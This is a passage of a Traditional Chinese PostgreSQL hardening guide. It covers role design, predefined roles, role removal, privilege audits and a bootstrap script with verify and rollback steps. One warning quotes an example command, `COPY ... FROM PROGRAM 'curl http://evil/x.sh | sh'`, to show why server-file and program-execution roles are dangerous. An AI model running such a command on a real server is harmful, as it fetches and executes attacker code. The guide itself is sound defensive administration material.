 session_user | current_user
--------------+--------------
 mig_hr       | hr_owner
```

★★★ `session_user` 仍是 `mig_hr` —— 稽核追得到人，而物件擁有者統一是 `hr_owner`。這是兩全的寫法。

> [!tip] 搭配 `ALTER ROLE ... IN DATABASE ... SET` 還能做這些
> ```sql
> ALTER ROLE app_hr IN DATABASE hr_app SET search_path = app, public;      -- ★★★★ 省掉程式改 schema
> ALTER ROLE rpt_hr IN DATABASE hr_app SET statement_timeout = '60s';      -- ★★★★ 報表拖垮正式庫的解藥
> ALTER ROLE rpt_hr IN DATABASE hr_app SET default_transaction_read_only = on;  -- ★★★ 雙保險
> ALTER ROLE rpt_hr IN DATABASE hr_app SET idle_in_transaction_session_timeout = '5min';
> ```
> ★★★ 這些設定**下次連線才生效**，改完記得請對方重連（連線池要重啟 pool）。
> 查目前設定：`SELECT rolname, setconfig FROM pg_roles r JOIN pg_db_role_setting s ON s.setrole = r.oid;`

### 預定義角色：不要再用 SUPERUSER 解問題

★★★★ 「監控要看 `pg_stat_activity` 的完整內容」「備份要讀所有表」—— 這兩個需求**都不需要 superuser**。PostgreSQL 內建了一組預定義角色：

| 預定義角色 | 給誰 | 能做什麼 | 星級 |
| --- | --- | --- | --- |
| `pg_read_all_data` | 邏輯備份帳號 | 所有表／檢視／序列的 SELECT + 所有 schema 的 USAGE | ★★★★ |
| `pg_write_all_data` | ★★★ 幾乎不該給 | 所有物件的 INSERT/UPDATE/DELETE | ★★★★ |
| `pg_monitor` | Zabbix / Prometheus exporter | 含下列三個：設定、統計、掃描 | ★★★★ |
| `pg_read_all_settings` | 監控 | 讀所有組態參數（含 superuser-only 的） | ★★★ |
| `pg_read_all_stats` | 監控 | 讀所有 `pg_stat_*` | ★★★ |
| `pg_stat_scan_tables` | 監控 | 執行會取 ACCESS SHARE 鎖的監控函式 | ★★ |
| `pg_signal_backend` | 值班維運 | 取消查詢／中斷 session（**不能對 superuser 動手**） | ★★★ |
| `pg_checkpoint` | 維運腳本 | 執行 `CHECKPOINT` | ★★ |
| `pg_maintain` | 維運腳本 | VACUUM / ANALYZE / REINDEX / CLUSTER（**PG17 起**） | ★★★ |
| `pg_use_reserved_connections` | 緊急維運帳號 | 用保留連線槽（PG16 起） | ★★★ |
| `pg_create_subscription` | 邏輯複寫 | 建立 subscription（PG16 起） | ★★★ |
| `pg_read_server_files` | ★★★★★ 別給 | 用 `COPY` 讀伺服器上任何檔案 | ★★★★★ |
| `pg_write_server_files` | ★★★★★ 別給 | 寫檔到伺服器任何位置 | ★★★★★ |
| `pg_execute_server_program` | ★★★★★ 別給 | 以資料庫使用者身分**執行 OS 程式** | ★★★★★ |

```sql
GRANT pg_read_all_data TO bak_hr;     -- 備份帳號的正解
GRANT pg_monitor       TO mon_exporter;
```

> [!danger] ★★★★★ `pg_read_all_data` **不會**繞過 RLS
> 官方明列它「Does not have BYPASSRLS set」。如果你的備份帳號只有這個角色，
> 而某張表開了 RLS，**備份出來的那張表會少列，而且 `pg_dump` 完全不報錯**。
> 這是「備份一直成功、還原才發現資料不全」的經典成因。
> 備份帳號的正確處理見 [[05-PostgreSQL-備份與還原]] 的還原演練那一節。
>
> 反過來說：`pg_read_server_files` + `pg_execute_server_program` 這三個 `server_*` 角色
> 等同於把 shell 交出去 —— `COPY x FROM PROGRAM 'curl http://evil/x.sh | sh'`。
> 它們存在的唯一理由是「有些備份工具需要」，**任何應用帳號都不該有**。

### 撤銷、變更與刪除角色

★★★★ PostgreSQL 刪角色比 MySQL 麻煩得多，因為角色可能**擁有物件**，也可能**被授予過權限**：

```sql
DROP ROLE rpt_hr;
```

```text
ERROR:  role "rpt_hr" cannot be dropped because some objects depend on it
DETAIL:  privileges for table staff
2 objects in database hr_app
```

正確的三步驟（★★★★ **每一個資料庫都要各做一次前兩步**）：

```bash
# 【1】把它擁有的物件轉給別人（在每個它有物件的資料庫執行）
sudo -u postgres psql -d hr_app -c "REASSIGN OWNED BY rpt_hr TO hr_owner;"
```

```text
REASSIGN OWNED
```

```bash
# 【2】清掉授予它的所有權限（★★★★ 這一步會【真的刪權限】，不可逆）
sudo -u postgres psql -d hr_app -c "DROP OWNED BY rpt_hr;"
```

```text
DROP OWNED
```

```bash
# 【3】現在才刪得掉（叢集層級，只需一次）
sudo -u postgres psql -c "DROP ROLE rpt_hr;"
```

```text
DROP ROLE
```

要找出它在哪些資料庫還有殘留：

```bash
sudo -u postgres psql -Atc "SELECT datname FROM pg_database WHERE datallowconn ORDER BY 1;" | \
while read -r db; do
  n=$(sudo -u postgres psql -d "$db" -Atc \
      "SELECT count(*) FROM pg_class c JOIN pg_roles r ON r.oid=c.relowner WHERE r.rolname='rpt_hr';")
  [ "$n" -gt 0 ] && echo "$db: $n 個物件"
done
```

```text
hr_app: 2 個物件
```

> [!tip] ★★★★ 離職／異動的正確順序，跟 MySQL 一樣「先鎖後刪」
> ```sql
> ALTER ROLE rpt_hr NOLOGIN;                      -- 第 0 天：停用，觀察
> ALTER ROLE rpt_hr VALID UNTIL '2026-08-28';     -- 密碼同時失效
> -- 觀察 7~30 天，確認沒有排程或報表在用
> REASSIGN OWNED BY rpt_hr TO hr_owner;           -- 第 30 天：轉移
> DROP OWNED BY rpt_hr;  DROP ROLE rpt_hr;
> ```
> 直接 `DROP ROLE` 的代價是：你不知道誰在用它，而且**權限沒有任何備份**。

### 權限盤點：三組查得到真相的查詢

★★★ `\dp` 適合看單一物件，**盤點要靠 SQL**。以下三支直接可用，輸出可以匯 CSV 交稽核。

**（一）誰對哪張表有什麼權限**

```sql
SELECT grantee, table_schema, table_name,
       string_agg(privilege_type, ',' ORDER BY privilege_type) AS privs
FROM information_schema.role_table_grants
WHERE table_schema NOT IN ('pg_catalog','information_schema')
GROUP BY 1,2,3
ORDER BY 1,2,3;
```

```text
  grantee  | table_schema | table_name |            privs
-----------+--------------+------------+------------------------------
 hr_ro     | app          | staff      | SELECT
 hr_rw     | app          | orders     | DELETE,INSERT,SELECT,UPDATE
 PUBLIC    | app          | code_dept  | SELECT          ← ★★★★ 這一列要立刻處理
```

**（二）★★★★ 找出所有對 PUBLIC 開放的物件**（這支查完通常會嚇一跳）

```sql
SELECT n.nspname AS schema, c.relname AS object, c.relkind, c.relacl
FROM pg_class c JOIN pg_namespace n ON n.oid = c.relnamespace
WHERE n.nspname NOT IN ('pg_catalog','information_schema')
  AND array_to_string(c.relacl, ',') LIKE '=%'
ORDER BY 1,2;
```

```text
 schema |  object   | relkind |               relacl
--------+-----------+---------+--------------------------------------
 app    | code_dept | r       | {hr_owner=arwdDxt/hr_owner,=r/hr_owner}
```

★★★★ ACL 裡出現 `=` 開頭那一段，就是 PUBLIC。

**（三）用函式驗證「這個角色到底能不能做這件事」**

```sql
SELECT has_database_privilege('app_hr','hr_app','CONNECT')  AS db_connect,
       has_schema_privilege  ('app_hr','app','USAGE')       AS schema_usage,
       has_table_privilege   ('app_hr','app.staff','SELECT') AS tbl_select,
       has_table_privilege   ('app_hr','app.staff','DELETE') AS tbl_delete,
       pg_has_role           ('app_hr','hr_rw','MEMBER')     AS in_hr_rw;
```

```text
 db_connect | schema_usage | tbl_select | tbl_delete | in_hr_rw
------------+--------------+------------+------------+----------
 t          | t            | t          | t          | t
```

★★★★ 這組函式是**變更後驗證**的最佳工具：它從伺服器的角度回答「有沒有權限」，不必真的拿帳號去連一次，可以整段寫進部署腳本的驗收步驟。

### 權限變更的變更管理

★★★★ 正式環境改權限，**四件事缺一不可**，跟 MySQL 那篇的原則一致：

```text
  【改前】pg_dumpall --roles-only     → 角色本身與成員關係的快照
          pg_dump -s --no-data ...    → 物件 ACL 的快照（GRANT 語句在 schema dump 裡）
  【改中】一次一個角色，用 SQL 語句，不要直接 UPDATE pg_authid
  【改後】用該角色本人（或 has_*_privilege）實測讀與寫，再打健康檢查端點
  【留痕】誰改、為什麼、核可單號 —— 稽核一定會問
```

角色快照指令：

```bash
sudo -u postgres pg_dumpall --roles-only > /var/backups/pg-grants/roles-$(date +%FT%H%M).sql
sudo -u postgres pg_dump -s hr_app        > /var/backups/pg-grants/hr_app-schema-$(date +%FT%H%M).sql
sudo chmod 600 /var/backups/pg-grants/*.sql
```

★★★★ `--roles-only` 的輸出**含密碼雜湊**，所以那個目錄必須 `chmod 700`、檔案 `600`。若要給第三方看，加 `--no-role-passwords`。

---

## 完整實戰範例

### 情境

機關人事系統 `hr_app`：Laravel 後端 + Nuxt 前端（見 [[03-範例-Nuxt與PostgreSQL]]），
資料庫 PostgreSQL 16 跑在 Ubuntu 24.04。目前的狀況是**所有東西都用 `postgres` 超級使用者連線**（很常見，也很危險）。

目標是一次到位地建立：

```text
  群組角色（NOLOGIN）        登入角色（LOGIN）        用途
  ─────────────────────      ──────────────────       ─────────────────────────
  hr_owner  擁有 schema  ←──  mig_hr   (SET only)      migration / DDL，平常不繼承
  hr_rw     讀寫         ←──  app_hr                   Laravel 應用
  hr_ro     唯讀         ←──  rpt_hr                   報表與統計（含 60s 逾時）
  pg_read_all_data       ←──  bak_hr                   pg_dump 邏輯備份
```

並且要能 **一鍵回滾**。

### 腳本：`/usr/local/bin/pg-role-bootstrap.sh`

```bash
#!/usr/bin/env bash
# pg-role-bootstrap.sh —— 為單一應用資料庫建立 owner / rw / ro 三層角色
#
#   sudo pg-role-bootstrap.sh --db hr_app --schema app --apply
#   sudo pg-role-bootstrap.sh --db hr_app --schema app --verify
#   sudo pg-role-bootstrap.sh --db hr_app --schema app --rollback
#
# ★★★★ 本腳本會修改權限，正式環境請先在測試機跑過 --apply 與 --rollback 各一次。
set -euo pipefail

DB=""; SCHEMA="app"; MODE=""
PREFIX=""                       # 由 DB 推導出角色名前綴
SNAP_DIR="/var/backups/pg-grants"
CRED_DIR="/etc/pg-credentials"
STAMP="$(date +%FT%H%M%S)"

say()  { printf '\033[1;36m==> %s\033[0m\n' "$*"; }
ok()   { printf '    \033[32m[OK]\033[0m %s\n' "$*"; }
die()  { printf '\033[1;31m[FATAL] %s\033[0m\n' "$*" >&2; exit 1; }

PSQL() { sudo -u postgres psql -X --no-psqlrc -v ON_ERROR_STOP=1 "$@"; }

# ── 參數 ────────────────────────────────────────────────────────────────
while [[ $# -gt 0 ]]; do
  case "$1" in
    --db)       DB="${2:-}";     shift 2 ;;
    --schema)   SCHEMA="${2:-}"; shift 2 ;;
    --apply|--verify|--rollback) MODE="${1#--}"; shift ;;
    *) die "未知參數：$1" ;;
  esac
done
[[ -n "$DB"   ]] || die "必須指定 --db <資料庫名>"
[[ -n "$MODE" ]] || die "必須指定 --apply / --verify / --rollback"
PREFIX="${DB%%_*}"                       # hr_app → hr
OWNER="${PREFIX}_owner"; RW="${PREFIX}_rw"; RO="${PREFIX}_ro"
APP="app_${PREFIX}"; RPT="rpt_${PREFIX}"; BAK="bak_${PREFIX}"; MIG="mig_${PREFIX}"

# ── 前置檢查 ────────────────────────────────────────────────────────────
preflight() {
  say "前置檢查"
  [[ $EUID -eq 0 ]] || die "請用 sudo 執行（需要切換到 postgres 帳號）"
  command -v psql >/dev/null || die "找不到 psql，請確認 postgresql-client 已安裝"
  id postgres >/dev/null 2>&1 || die "找不到 postgres 系統帳號"

  local ver
  ver="$(PSQL -Atc 'SHOW server_version_num;')" || die "無法連線到 PostgreSQL"
  [[ "$ver" -ge 150000 ]] || die "本腳本假設 PostgreSQL 15 以上（偵測到 $ver）"
  ok "PostgreSQL server_version_num = $ver"

  PSQL -Atc "SELECT 1 FROM pg_database WHERE datname='${DB}';" | grep -q 1 \
    || die "資料庫 ${DB} 不存在，請先建立"
  ok "資料庫 ${DB} 存在"

  local enc
  enc="$(PSQL -Atc 'SHOW password_encryption;')"
  [[ "$enc" == "scram-sha-256" ]] \
    || die "password_encryption 目前是 ${enc}，請先改成 scram-sha-256（見 04 篇）再執行"
  ok "password_encryption = ${enc}"

  install -d -m 700 -o root -g root "$SNAP_DIR" "$CRED_DIR"
  ok "快照目錄 $SNAP_DIR、憑證目錄 $CRED_DIR 就緒（700）"
}

# ── 快照（回滾的依據）────────────────────────────────────────────────────
snapshot() {
  say "建立回滾快照"
  sudo -u postgres pg_dumpall --roles-only > "${SNAP_DIR}/roles-${STAMP}.sql"
  sudo -u postgres pg_dump -s "$DB"        > "${SNAP_DIR}/${DB}-schema-${STAMP}.sql"
  PSQL -d "$DB" -Atc "
    SELECT n.nspname||'.'||c.relname||' :: '||coalesce(array_to_string(c.relacl,','),'(default)')
    FROM pg_class c JOIN pg_namespace n ON n.oid=c.relnamespace
    WHERE n.nspname NOT IN ('pg_catalog','information_schema') ORDER BY 1;
  " > "${SNAP_DIR}/${DB}-acl-${STAMP}.txt"
  chmod 600 "${SNAP_DIR}"/*-"${STAMP}".*
  # ★★★★ 快照是空的代表 pg_dumpall 失敗，這時候絕對不能往下做
  [[ -s "${SNAP_DIR}/roles-${STAMP}.sql" ]] || die "角色快照是空的，中止"
  ln -sfn "${SNAP_DIR}/roles-${STAMP}.sql" "${SNAP_DIR}/roles-latest.sql"
  ok "快照：${SNAP_DIR}/roles-${STAMP}.sql（含密碼雜湊，權限 600）"
}

mkpass() { openssl rand -base64 30 | tr -d '/+=' | cut -c1-24; }

# ── 套用 ────────────────────────────────────────────────────────────────
apply() {
  say "建立群組角色與登入角色"
  local p_app p_rpt p_bak p_mig
  p_app="$(mkpass)"; p_rpt="$(mkpass)"; p_bak="$(mkpass)"; p_mig="$(mkpass)"

  # ★★★★ SET log_statement='none' 讓密碼不會被寫進伺服器日誌
  PSQL -d "$DB" <<SQL
SET log_statement = 'none';
SET log_min_duration_statement = -1;

DO \$\$
DECLARE r text;
BEGIN
  FOREACH r IN ARRAY ARRAY['${OWNER}','${RW}','${RO}'] LOOP
    IF NOT EXISTS (SELECT 1 FROM pg_roles WHERE rolname = r) THEN
      EXECUTE format('CREATE ROLE %I NOLOGIN', r);
    END IF;
  END LOOP;
END \$\$;

DO \$\$
BEGIN
  IF NOT EXISTS (SELECT 1 FROM pg_roles WHERE rolname='${APP}') THEN
    CREATE ROLE ${APP} LOGIN CONNECTION LIMIT 40;
  END IF;
  IF NOT EXISTS (SELECT 1 FROM pg_roles WHERE rolname='${RPT}') THEN
    CREATE ROLE ${RPT} LOGIN CONNECTION LIMIT 5;
  END IF;
  IF NOT EXISTS (SELECT 1 FROM pg_roles WHERE rolname='${BAK}') THEN
    CREATE ROLE ${BAK} LOGIN CONNECTION LIMIT 2;
  END IF;
  IF NOT EXISTS (SELECT 1 FROM pg_roles WHERE rolname='${MIG}') THEN
    CREATE ROLE ${MIG} LOGIN CONNECTION LIMIT 3;
  END IF;
END \$\$;

ALTER ROLE ${APP} PASSWORD '${p_app}';
ALTER ROLE ${RPT} PASSWORD '${p_rpt}';
ALTER ROLE ${BAK} PASSWORD '${p_bak}';
ALTER ROLE ${MIG} PASSWORD '${p_mig}';
RESET log_statement;

-- 成員關係：★★★★ mig 只給 SET，不繼承 —— 平常動不了 DDL
GRANT ${RW}    TO ${APP};
GRANT ${RO}    TO ${RPT};
GRANT ${OWNER} TO ${MIG} WITH INHERIT FALSE, SET TRUE;
GRANT pg_read_all_data TO ${BAK};
SQL
  ok "四個登入角色與三個群組角色就緒"

  say "資料庫與 schema 層：先關門再開窗"
  PSQL -d "$DB" <<SQL
REVOKE ALL ON DATABASE ${DB} FROM PUBLIC;
GRANT  CONNECT ON DATABASE ${DB} TO ${APP}, ${RPT}, ${BAK}, ${MIG};
GRANT  TEMPORARY ON DATABASE ${DB} TO ${APP};        -- ★★★ 部分 ORM 需要暫存表

-- public schema：★★★★ 升級上來的叢集不會自動變安全，這裡補做
ALTER SCHEMA public OWNER TO pg_database_owner;
REVOKE CREATE ON SCHEMA public FROM PUBLIC;

CREATE SCHEMA IF NOT EXISTS ${SCHEMA} AUTHORIZATION ${OWNER};
ALTER  SCHEMA ${SCHEMA} OWNER TO ${OWNER};
GRANT  USAGE ON SCHEMA ${SCHEMA} TO ${RW}, ${RO};
SQL
  ok "資料庫 CONNECT 收斂、${SCHEMA} schema 擁有者為 ${OWNER}"

  say "既有物件授權（快照）"
  PSQL -d "$DB" <<SQL
GRANT SELECT, INSERT, UPDATE, DELETE ON ALL TABLES    IN SCHEMA ${SCHEMA} TO ${RW};
GRANT SELECT                         ON ALL TABLES    IN SCHEMA ${SCHEMA} TO ${RO};
GRANT USAGE, SELECT                  ON ALL SEQUENCES IN SCHEMA ${SCHEMA} TO ${RW};
GRANT SELECT                         ON ALL SEQUENCES IN SCHEMA ${SCHEMA} TO ${RO};
SQL
  ok "既有表與序列已授權"

  say "預設權限（規則，管未來的物件）"
  PSQL -d "$DB" <<SQL
ALTER DEFAULT PRIVILEGES FOR ROLE ${OWNER} IN SCHEMA ${SCHEMA}
  GRANT SELECT, INSERT, UPDATE, DELETE ON TABLES TO ${RW};
ALTER DEFAULT PRIVILEGES FOR ROLE ${OWNER} IN SCHEMA ${SCHEMA}
  GRANT SELECT ON TABLES TO ${RO};
ALTER DEFAULT PRIVILEGES FOR ROLE ${OWNER} IN SCHEMA ${SCHEMA}
  GRANT USAGE, SELECT ON SEQUENCES TO ${RW};
ALTER DEFAULT PRIVILEGES FOR ROLE ${OWNER} IN SCHEMA ${SCHEMA}
  GRANT SELECT ON SEQUENCES TO ${RO};
ALTER DEFAULT PRIVILEGES FOR ROLE ${OWNER} IN SCHEMA ${SCHEMA}
  REVOKE EXECUTE ON FUNCTIONS FROM PUBLIC;
SQL
  ok "ALTER DEFAULT PRIVILEGES 已設定（FOR ROLE ${OWNER}）"

  say "每個角色的連線期設定"
  PSQL -d "$DB" <<SQL
ALTER ROLE ${APP} IN DATABASE ${DB} SET search_path = ${SCHEMA}, public;
ALTER ROLE ${RPT} IN DATABASE ${DB} SET search_path = ${SCHEMA}, public;
ALTER ROLE ${RPT} IN DATABASE ${DB} SET statement_timeout = '60s';
ALTER ROLE ${RPT} IN DATABASE ${DB} SET default_transaction_read_only = on;
ALTER ROLE ${RPT} IN DATABASE ${DB} SET idle_in_transaction_session_timeout = '5min';
ALTER ROLE ${MIG} IN DATABASE ${DB} SET role = '${OWNER}';   -- ★★★★ DDL 一律以 owner 身分建
SQL
  ok "search_path / statement_timeout / role 已套用（下次連線生效）"

  say "寫出憑證檔（.pgpass 格式，600）"
  umask 077
  {
    echo "127.0.0.1:5432:${DB}:${APP}:${p_app}"
    echo "127.0.0.1:5432:${DB}:${RPT}:${p_rpt}"
    echo "127.0.0.1:5432:*:${BAK}:${p_bak}"
    echo "127.0.0.1:5432:${DB}:${MIG}:${p_mig}"
  } > "${CRED_DIR}/${DB}.pgpass"
  chmod 600 "${CRED_DIR}/${DB}.pgpass"
  ok "憑證：${CRED_DIR}/${DB}.pgpass（★★★★ 抄進 Laravel .env 後請刪除或移到金鑰保管庫）"
}

# ── 驗證 ────────────────────────────────────────────────────────────────
verify() {
  say "伺服器端權限判定"
  PSQL -d "$DB" -c "
    SELECT '${APP}' AS role,
           has_database_privilege('${APP}','${DB}','CONNECT')       AS db_conn,
           has_schema_privilege  ('${APP}','${SCHEMA}','USAGE')     AS sch_usage,
           pg_has_role           ('${APP}','${RW}','MEMBER')        AS in_rw
    UNION ALL
    SELECT '${RPT}',
           has_database_privilege('${RPT}','${DB}','CONNECT'),
           has_schema_privilege  ('${RPT}','${SCHEMA}','USAGE'),
           pg_has_role           ('${RPT}','${RO}','MEMBER');"

  say "PUBLIC 殘留檢查（★★★★ 必須是 0 列）"
  PSQL -d "$DB" -c "
    SELECT n.nspname, c.relname, c.relacl
    FROM pg_class c JOIN pg_namespace n ON n.oid=c.relnamespace
    WHERE n.nspname NOT IN ('pg_catalog','information_schema')
      AND array_to_string(c.relacl,',') LIKE '=%';"

  say "實際登入測試（用 ${RPT}，寫入必須被拒）"
  local pf="${CRED_DIR}/${DB}.pgpass"
  [[ -f "$pf" ]] || die "找不到 ${pf}，請先 --apply"
  PGPASSFILE="$pf" psql "host=127.0.0.1 dbname=${DB} user=${RPT}" \
    -Atc "SELECT current_user, current_setting('statement_timeout');" \
    || die "報表帳號連不上，請檢查 pg_hba.conf（見 04 篇）"
  if PGPASSFILE="$pf" psql "host=127.0.0.1 dbname=${DB} user=${RPT}" \
       -Atc "CREATE TABLE ${SCHEMA}._probe(i int);" 2>/dev/null; then
    die "★★★★★ 唯讀帳號竟然建得出表，權限設定失敗，請立刻 --rollback"
  fi
  ok "唯讀帳號寫入被拒，符合預期"
}

# ── 回滾 ────────────────────────────────────────────────────────────────
rollback() {
  say "回滾：移除本腳本建立的角色"
  local snap="${SNAP_DIR}/roles-latest.sql"
  [[ -f "$snap" ]] || die "找不到快照 ${snap}，無法安全回滾"
  printf '將刪除角色：%s %s %s %s %s %s %s\n' \
      "$APP" "$RPT" "$BAK" "$MIG" "$RW" "$RO" "$OWNER"
  read -r -p "確認執行？(輸入 yes) " a; [[ "$a" == "yes" ]] || die "已取消"

  for r in "$APP" "$RPT" "$BAK" "$MIG" "$RW" "$RO" "$OWNER"; do
    PSQL -d "$DB" -c "REASSIGN OWNED BY ${r} TO postgres;" 2>/dev/null || true
    PSQL -d "$DB" -c "DROP OWNED BY ${r};"                 2>/dev/null || true
    PSQL       -c "DROP ROLE IF EXISTS ${r};"              2>/dev/null || true
    ok "已移除 ${r}"
  done
  PSQL -d "$DB" -c "GRANT ALL ON DATABASE ${DB} TO PUBLIC;"   # 還原出廠狀態
  rm -f "${CRED_DIR}/${DB}.pgpass"
  say "回滾完成。★★★ 角色屬性快照仍保留在 ${snap}，必要時可 psql -f 還原。"
}

preflight
case "$MODE" in
  apply)    snapshot; apply; verify ;;
  verify)   verify ;;
  rollback) snapshot; rollback ;;
esac
say "完成（模式：$MODE）"
```

安裝與執行：

```bash
sudo install -m 750 -o root -g root pg-role-bootstrap.sh /usr/local/bin/pg-role-bootstrap.sh
sudo /usr/local/bin/pg-role-bootstrap.sh --db hr_app --schema app --apply
```

預期輸出（節錄）：

```text
==> 前置檢查
    [OK] PostgreSQL server_version_num = 160004
    [OK] 資料庫 hr_app 存在
    [OK] password_encryption = scram-sha-256
==> 建立回滾快照
    [OK] 快照：/var/backups/pg-grants/roles-2026-08-28T091203.sql（含密碼雜湊，權限 600）
==> 預設權限（規則，管未來的物件）
    [OK] ALTER DEFAULT PRIVILEGES 已設定（FOR ROLE hr_owner）
==> PUBLIC 殘留檢查（★★★★ 必須是 0 列）
 nspname | relname | relacl
---------+---------+--------
(0 rows)
==> 實際登入測試（用 rpt_hr，寫入必須被拒）
rpt_hr|60s
    [OK] 唯讀帳號寫入被拒，符合預期
==> 完成（模式：apply）
```

### 驗收檢查表

| # | 檢查項 | 指令 | 預期結果 | 星級 |
| --- | --- | --- | --- | --- |
| 1 | 三個群組角色都不能登入 | `psql -Atc "SELECT rolname FROM pg_roles WHERE rolname IN ('hr_owner','hr_rw','hr_ro') AND rolcanlogin;"` | **無輸出** | ★★★★ |
| 2 | 沒有多出來的 superuser | `psql -Atc "SELECT rolname FROM pg_roles WHERE rolsuper;"` | 只有 `postgres` | ★★★★★ |
| 3 | 資料庫不再對 PUBLIC 開放 | `psql -Atc "SELECT datacl FROM pg_database WHERE datname='hr_app';"` | 不含 `=Tc/` 這段 | ★★★★ |
| 4 | `public` schema 不能被建表 | `psql -d hr_app -Atc "SELECT nspacl FROM pg_namespace WHERE nspname='public';"` | 不含 `=UC` | ★★★★ |
| 5 | 預設權限有設 | `psql -d hr_app -c '\ddp'` | table / sequence 各兩列 | ★★★★★ |
| 6 | 新表自動有權限 | `SET ROLE hr_owner; CREATE TABLE app._t(i int); \dp app._t` | 出現 `hr_rw=arwd` 與 `hr_ro=r` | ★★★★★ |
| 7 | 應用帳號能寫 | `PGPASSFILE=... psql "user=app_hr" -c "INSERT INTO app.orders(...) VALUES(...);"` | `INSERT 0 1` | ★★★★ |
| 8 | 報表帳號寫入被拒 | `PGPASSFILE=... psql "user=rpt_hr" -c "DELETE FROM app.orders;"` | `ERROR:  permission denied for table orders` | ★★★★ |
| 9 | 報表帳號有逾時保護 | `psql "user=rpt_hr" -Atc "SHOW statement_timeout;"` | `60s` | ★★★ |
| 10 | migration 帳號預設動不了 DDL | `psql "user=mig_hr" -c "SELECT current_user;"` | `hr_owner`（因 `SET role`） | ★★★★ |
| 11 | 備份帳號讀得到全部 | `PGPASSFILE=... pg_dump -U bak_hr -h 127.0.0.1 hr_app > /dev/null` | 無錯誤 | ★★★★ |
| 12 | 憑證檔權限正確 | `stat -c '%a %n' /etc/pg-credentials/hr_app.pgpass` | `600 ...` | ★★★★ |
| 13 | 回滾可用 | 測試機執行 `--rollback` 後再 `--apply` | 兩次都成功 | ★★★★★ |

---

## 常見錯誤與排錯

| 現象 | 原因 | 解法 |
| --- | --- | --- |
| **★★★★★ 新 migration 之後應用 500，`ERROR: permission denied for table <新表>`** | 只做了 `GRANT ... ON ALL TABLES`，沒做 `ALTER DEFAULT PRIVILEGES`；或 `FOR ROLE` 寫的不是實際建表的角色 | 補 `ALTER DEFAULT PRIVILEGES FOR ROLE <建表者> IN SCHEMA app GRANT ... ON TABLES TO hr_rw;`，並用 `\dt app.*` 確認新表 Owner |
| **★★★★★ `pg_dump` 成功但還原後某張表少了列** | 該表有 RLS，備份角色沒有 `BYPASSRLS`（`pg_read_all_data` **不繞過 RLS**） | 備份改用有 `BYPASSRLS` 的角色或表擁有者；見 [[05-PostgreSQL-備份與還原]] |
| **★★★★ `ERROR: permission denied for schema app`，表權限明明給了** | 漏了 `GRANT USAGE ON SCHEMA app`（MySQL 沒有這層，最常漏） | `GRANT USAGE ON SCHEMA app TO hr_rw, hr_ro;` |
| **★★★★ `ERROR: permission denied for sequence orders_id_seq`（SELECT 正常、INSERT 失敗）** | `bigserial` 欄位插入時要用序列，只給表權限不夠 | `GRANT USAGE, SELECT ON ALL SEQUENCES IN SCHEMA app TO hr_rw;` 並補上預設權限 |
| **★★★★ `FATAL: role "hr_rw" is not permitted to log in`** | 把 NOLOGIN 的群組角色寫進 `.env` 的 `DB_USERNAME` | 改用登入角色 `app_hr`；群組角色**不要**加 `LOGIN` |
| **★★★★ `FATAL: permission denied for database "hr_app"` + `DETAIL: User does not have CONNECT privilege.`** | 做了 `REVOKE ALL ON DATABASE ... FROM PUBLIC` 卻忘了 `GRANT CONNECT` 給新角色 | `GRANT CONNECT ON DATABASE hr_app TO <角色>;` |
| **★★★★ 授權了卻沒生效，`\du` 看起來也對** | 你在 `postgres` 資料庫裡下 `GRANT`，但物件在 `hr_app` 裡（權限是**每個資料庫獨立**的） | `psql -d hr_app` 重下一次；用 `\ddp` 與 `\dp` 在**目標資料庫**確認 |
| **★★★★ `ERROR: relation "orders" does not exist`，但表明明在** | 這**不是權限問題**，是 `search_path` 沒有含 `app` | `ALTER ROLE app_hr IN DATABASE hr_app SET search_path = app, public;`（下次連線生效）或查詢寫全名 `app.orders` |
| **★★★★ `ERROR: role "rpt_hr" cannot be dropped because some objects depend on it`** | 該角色擁有物件或被授過權限 | 在**每個相關資料庫**執行 `REASSIGN OWNED BY rpt_hr TO hr_owner; DROP OWNED BY rpt_hr;` 之後才 `DROP ROLE` |
| **★★★★ `ERROR: must be owner of table orders`（做 `ALTER TABLE` / `DROP` 時）** | 表層 `ALL PRIVILEGES` **不包含**「改結構」，改結構只有擁有者與 superuser 能做 | 用 `SET ROLE hr_owner;` 之後再執行；或把表擁有者統一改成 `hr_owner` |
| **★★★ `ERROR: must have admin option on role "hr_rw"`** | PG16 收緊了 `CREATEROLE`，加成員需要對目標角色有 ADMIN OPTION | `GRANT hr_rw TO dba_user WITH ADMIN OPTION;`（由 superuser 執行） |
| **★★★ 改了 `statement_timeout` 卻沒生效** | `ALTER ROLE ... SET` 只影響**新連線**，而連線池（PgBouncer / Laravel 常駐）握著舊連線 | 重啟應用或連線池；用 `SHOW statement_timeout;` 在該連線內確認 |
| **★★★ `\du` 找不到 "Member of" 欄位** | PG16 起已移除該欄 | 改用 `\drg`，還能一併看到 `INHERIT` / `SET` / `ADMIN` 選項 |
| **★★★ `FATAL: password authentication failed for user "app_hr"`，密碼確定正確** | `~/.pgpass` 權限不是 600 被 libpq 忽略；或 `password_encryption` 從 md5 改成 scram 後沒重設密碼 | `chmod 600 ~/.pgpass`；用 `\password app_hr` 重設，並查 `pg_authid.rolpassword` 開頭 |
| **★★★ 唯讀帳號的一支 SQL 把正式庫拖垮** | 沒設 `statement_timeout` 與 `CONNECTION LIMIT` | `ALTER ROLE rpt_hr IN DATABASE hr_app SET statement_timeout='60s'; ALTER ROLE rpt_hr CONNECTION LIMIT 5;` |
| **★★★ 升級到 PG16 後，`public` schema 還是人人可建表** | `pg_upgrade` / `pg_dump` 會照抄舊 ACL，不會套用 PG15 的新預設 | 每個資料庫執行 `ALTER SCHEMA public OWNER TO pg_database_owner; REVOKE CREATE ON SCHEMA public FROM PUBLIC;` |
| **★★★ `VALID UNTIL` 到期了帳號還連得進來** | 它只讓**密碼**失效；`pg_hba.conf` 那條若是 `peer` / `trust` / `cert` 就不受影響 | 停用請用 `ALTER ROLE x NOLOGIN;`，並檢查 `pg_hba.conf`（見 [[04-PostgreSQL-設定檔與pg_hba]]） |
| **★★ `SELECT` 有結果但少了幾列，沒有任何錯誤** | 表上啟用了 RLS 而該角色沒有對應 policy | `SELECT relrowsecurity FROM pg_class WHERE relname='staff';` 為 `t` 就是它；處理見 [[08-PostgreSQL-安全強化]] |
| **★★ 密碼出現在 `/var/log/postgresql/*.log`** | `log_statement = 'ddl'` 或 `'all'` 把 `CREATE ROLE ... PASSWORD '...'` 整句記下來 | 改用 `\password`；腳本內先 `SET log_statement='none';`，並把既有日誌視為已外洩、重設密碼 |

### 排查步驟

**★★★★ 遇到 `permission denied` 一律照這個順序走，不要先亂 `GRANT ALL`。**

